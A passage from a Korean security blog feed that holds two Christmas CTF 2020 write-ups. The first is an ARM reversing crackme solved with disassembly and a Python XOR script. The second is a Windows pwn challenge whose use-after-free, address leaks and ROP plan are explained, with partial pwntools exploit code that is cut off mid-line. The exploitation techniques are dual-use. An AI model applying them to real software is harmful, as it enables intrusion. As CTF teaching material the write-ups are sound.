class="hljs-attribute">b50</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">b54</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b58</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b5c</span>:   <span class="hljs-number">54000761</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b60</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b64</span>:   <span class="hljs-number">91001000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">4</span> <span class="hljs-attribute">b68</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b6c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b70</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b74</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b78</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b7c</span>:   <span class="hljs-number">54000661</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b80</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b84</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b88</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b8c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b90</span>:   <span class="hljs-number">91002800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xa <span class="hljs-attribute">b94</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b98</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b9c</span>:   <span class="hljs-number">54000561</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">ba0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ba4</span>:   <span class="hljs-number">91001</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">7</span> <span class="hljs-attribute">ba8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bac</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bb0</span>:   <span class="hljs-number">91004400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">11</span> <span class="hljs-attribute">bb4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bb8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bbc</span>:   <span class="hljs-number">54000461</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">bc0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">bc4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">bc8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bcc</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bd0</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">bd4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bd8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bdc</span>:   <span class="hljs-number">54000361</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">be0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">be4</span>:   <span class="hljs-number">91001400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">5</span> <span class="hljs-attribute">be8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bec</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bf0</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">34</span> <span class="hljs-attribute">bf4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bf8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bfc</span>:   <span class="hljs-number">54000261</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c00</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c04</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c08</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c0c</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">35</span> <span class="hljs-attribute">c10</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c14</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c18</span>:   <span class="hljs-number">54000181</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c1c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c20</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c24</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c28</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c2c</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c30</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c34</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c38</span>:   <span class="hljs-number">54000081</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c3c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c40</span>:   <span class="hljs-number">97</span>ffffab    bl  aec &lt;sub_aec&gt; <span class="hljs-attribute">c44</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">c48</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> c4c:   d65f03c0    ret</span></code></pre><p>위에서 복호화한 <code>[a-zA-Z0-9]</code> 값과 입력 값을 통해 하나씩 비교한 후 조건이 모두 맞으면 <code>x0</code>에  input 값을 넣고 <code>sub_aec</code>를 호출합니다. 값을 비교하는 부분을 간단하게 정리하면 아래와 같습니다.</p><ul><li>var1[0x6] == var2[0xe]</li><li>var1[0x4] == var2[0x3]</li><li>var1[0x3] == var2[0xa]</li><li>var1[0x7] == var2[0x11]</li><li>var1[0x1] == var2[0xe]</li><li>var1[0x5] == var2[0x34]</li><li>var1[0x0] == var2[0x35]</li><li>var1[0x2] == var2[0x2]</li></ul><p>순서에 맞춰서 배열하면 input 값을 구할 수 있습니다.</p><pre><code class="hljs python">user_input = <span class="hljs-string">&quot;&quot;</span>user_input += result[<span class="hljs-number">0x35</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x2</span>] + result[<span class="hljs-number">0xa</span>] + result[<span class="hljs-number">0x3</span>] +result[<span class="hljs-number">0x34</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x11</span>]print(user_input)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>조건이 맞는 입력 값을 인자로 <code>sub_aec</code> 값을 호출하니 해당 함수를 확인해보면 아래와 같습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value2</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">38</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">43</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">45</span>, <span class="hljs-number">0</span>xE, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>C,<span class="hljs-attribute">0x8</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">44</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>,<span class="hljs-attribute">0x6E</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span><span class="hljs-attribute">0000000000000aec</span> &lt;sub_aec&gt;: <span class="hljs-attribute">aec</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> af0:   910003fd    mov x29, sp</span><span class="hljs-meta"> af4:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">af8</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">afc</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">29</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">b00</span>:   <span class="hljs-number">2</span>a<span class="hljs-number">0003</span>e<span class="hljs-number">3</span>    mov w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b04</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">2</span>    ldr x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b08</span>:   <span class="hljs-number">528003</span>e<span class="hljs-number">1</span>    mov w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f                   // #<span class="hljs-number">31</span> <span class="hljs-attribute">b0c</span>:   <span class="hljs-number">90000000</span>    adrp    x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@page <span class="hljs-attribute">b10</span>:   <span class="hljs-number">91382000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@pageoff <span class="hljs-attribute">b14</span>:   <span class="hljs-number">97</span>ffffba    bl  <span class="hljs-number">9</span>fc &lt;sub_<span class="hljs-number">9</span>fc&gt; <span class="hljs-attribute">b18</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b1c</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>c    bl  <span class="hljs-number">810</span> &lt;puts@plt&gt; <span class="hljs-attribute">b24</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">b28</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> b2c:   d65f03c0    ret</span></code></pre><p>입력 값과 value2를 인자로 <code>sub_9fc</code>를 수행하는 것을 확인할 수 있습니다. <code>sub_9fc</code>의 경우 아까 python script를 짜 놓았기 때문에 그냥 값을 입력하여 연산하면 됩니다.</p><pre><code class="hljs python">string3 = [    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x3C</span>,<span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x17</span>,<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x12</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string3)):    flag += chr(string3[i] ^ ord(user_input[i % len(user_input)]))print(flag)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">XMAS&#123;s4nta_can_enter_the_h0use&#125;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>FLAG : XMAS{s4nta_can_enter_the_h0use}</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      <category domain="https://hackyboiz.github.io/tags/arm/">arm</category>
      
      <category domain="https://hackyboiz.github.io/tags/crackme/">crackme</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-lock/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - Address Book</title>
      <link>https://hackyboiz.github.io/2020/12/29/l0ch/address_book/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/address_book/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ&lt;/p&gt;
&lt;p&gt;idioth형이 대회 중간에 0솔</description>
        
      
      
      
      <content:encoded><![CDATA[<p>처음으로 낸 Windows 환경의 문제입니다..! 대회 당일날 시작과 동시에 공개된 문제이나 12시간이 되도록 솔버가 안나와서 solvable한 문제가 아닌가 대회 내내 걱정했던 친구이기도 하죠 ㅠㅠ</p><p>idioth형이 대회 중간에 0솔버를 위한 선물이라고 짤을 하나 보내줬는데…</p><p><img src="/2020/12/29/l0ch/address_book/1.png"></p><blockquote><p>즌쯔… 느므 그믑느…^^</p></blockquote><p>그래도 대회 12시간만에 다행히 솔버가 나와서 다행이라고 생각합니다 ㅎㅎ.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>먼저, 문제 환경부터 보시죠</p><blockquote><p>Windows 64bit Version 10.0.19041.264 ASLR: True DEP: True SafeSEH: True Stack Cookie: True</p></blockquote><p>64bit 윈도우 10 환경이며, 보호기법은 모두 걸려있네요!</p><p>어떤 기능들이 있는지 보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/2.png"></p><ol><li><p>Add address Info</p><p>name, address, city를 입력받고 address info를 추가</p></li><li><p>Address Info List</p><p>추가한 address info들을 출력</p></li><li><p>Delete address Info</p><p>address info를 삭제. 이 때 삭제된 info는 Recycle Bin List에 추가</p></li><li><p>Restore address Info</p><p>삭제된 info를 원래 List로 복구</p></li><li><p>Modify address Info</p><p>수정할 address info를 선택해 name, address, city를 수정 가능</p></li><li><p>Empty List</p><p>address list와 recycle bin list 항목을 모두 삭제</p></li><li><p>Exit</p></li></ol><p>7번으로 종료하면</p><p><img src="/2020/12/29/l0ch/address_book/3.png"></p><p>list가 저장되었다고 뜨는데, 옆에 메모리 주소로 보이는 값이 존재합니다.</p><p>리스트는 double linked list로 구현되어 있으며 처음에 <code>Address Book</code>, <code>Recycle Bin</code> 두개의 객체가 할당되어 각각 2byte 정수 type의 reference count (초기값=10)를 가집니다. 함수가 객체를 참조할 때 count가 10 올라가며 해당 함수를 빠져나올때 count가 10 감소하고 10보다 작으면 할당된 객체를 free하고 객체의 주소를 출력합니다.</p><p>감이 오시죠. C++의 공유포인터 <code>std::shared_ptr</code> 를 커스텀 구현한 문제입니다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>Recycle Bin</code>의 info를 restore할때 복구하는 노드에서, <code>Recycle Bin</code>에서 사용한 next 값이 초기화되지 않고 남아있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/4.png"><br>노드를 네 개 생성한 뒤 4, 3을 차례대로 삭제하면 Recycle Bin 리스트에 순서대로 들어갑니다.</p><p><img src="/2020/12/29/l0ch/address_book/5.png"></p><p>Restore 4로 <code>Address List</code>로 복구했을때 node 4의 next 가 초기화되지 않고 여전히 <code>Recycle Bin</code>의 3을 가리킵니다.</p><p><img src="/2020/12/29/l0ch/address_book/6.png"></p><p>Restore 3을 하면 <code>Address List</code>에 index 순서에 맞게 2와 4 사이에 삽입되고 결과적으로 다음과 같이 3과 4의 next가 각각 서로를 가리키게 되어 순환적인 구조를 가진 리스트를 만들 수 있습니다.</p><p><code>Address List</code>의 노드들을 출력하는 함수는 노드의 next가 NULL일때까지 혹은 입력한 수만큼 재귀호출을 통해 head 노드부터 출력합니다. 이때 입력한 수를 검증하지 않아 reference counter의  integer overflow가 발생할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/7.png"><br>재귀함수의 인자로 <code>Address List</code>의 포인터가 들어가는데, 재귀함수가 한 번 호출될때마다 <code>Address List</code>의 reference count가 10씩 증가합니다. </p><p>위와 같이 취약점을 트리거했을 때 정확히 3275만큼 재귀로 참조하면 2byte 정수 조건을 벗어나게 되어 free 조건인 <code>reference count &lt; 10</code> 을 만족하게 되고 AddressBook 포인터가 한 번 free됩니다.  </p><p>이어 Add Address Info에서 노드를 새로 할당하는 것으로 UAF를 트리거할 수 있어 Address Info에서 <code>name</code> 으로 vtable 을 overwrite 해 eip control이 가능합니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>바이너리에서 <code>flag.txt</code>를 open했으니 <code>read</code>와 <code>write</code>로 flag 내용을 출력하기만 하면 됩니다.</p><pre><code class="hljs c">read(<span class="hljs-number">3</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))  <span class="hljs-comment">// 3 : file descriptor</span>write(<span class="hljs-number">1</span>, buffer, <span class="hljs-keyword">sizeof</span>(flag))</code></pre><p>ROP에 필요한 건 다음과 같습니다.</p><p><code>ntdll.dll</code> base address → gadget</p><p><code>ucrtbase.dll</code> base address → <code>read</code>, <code>write</code></p><p>위 주소들을 구하기 위해서 먼저 바이너리의 imagebase부터 leak해야 합니다.</p><p>UAF 이후 leak은 Address Info를 출력할 때 <code>head</code> 포인터 값에서부터 참조하는 것을 이용해 Address Info의 <code>city+16</code> 에서 <code>head</code> 포인터를 overwrite → OOB read가 가능한 점을 이용합니다.</p><p><img src="/2020/12/29/l0ch/address_book/8.png"></p><p>몇번 실행해보면 객체간 offset 에 패턴이 있습니다. offset을 계산해서 city+16 에 Recycle Bin의 주소로 head 를 overwrite하고 2번 메뉴로 출력하면 vtable 주소를 구할 수 있습니다.</p><p><img src="/2020/12/29/l0ch/address_book/9.png"></p><p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a911dc27-9eb4-468b-8ba8-df4fcc9d778e/Untitled.png" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a911dc27-9eb4-468b-8ba8-df4fcc9d778e/Untitled.png"></p><p><code>Recycle Bin</code>의 vtable offset은 0x6960이니 leak한 vtable에 offset만큼 빼면 imagebase가 나오겠군요!</p><p>이제 imagebase를 구했으니 dll 주소를 구하는건 쉽습니다!</p><p>구하고싶은 dll의 아무 함수나 IAT 테이블에서 offset을 찾고, imagebase+offset 주소에 존재하는 dll 함수 주소를 leak하면 되죠. <code>ntdll</code>부터 구해보겠습니다.</p><p><img src="/2020/12/29/l0ch/address_book/10.png"></p><p><code>!dh imagebase</code> 로 IAT offset을 찾고 Import된 dll 함수를 찾아볼게요</p><p><img src="/2020/12/29/l0ch/address_book/11.png"></p><p><code>ntdll!RtlInitializeSListHead</code> 가 imagebase+ 0x6060에 있네요.</p><p><code>ucrtbase!free</code> 도 imagebase + 0x61f0 인걸 확인할 수 있습니다.</p><p>vtable을 leak했을 때와 같은 방법으로 <code>head</code>를 overwrite해 해당 메모리에 있는 값을 출력하고 각각 dll 내 offset을 빼주면 dll base address를 구할 수 있습니다!</p><h2 id="imagebase-dll-leak"><a href="#imagebase-dll-leak" class="headerlink" title="imagebase/dll leak"></a>imagebase/dll leak</h2><pre><code class="hljs python"><span class="hljs-comment"># 전체 코드는 아래 Exploit Code 참조</span><span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span><span class="hljs-comment"># leak ucrtbase</span>modifyAddr(<span class="hljs-number">-1</span>,<span 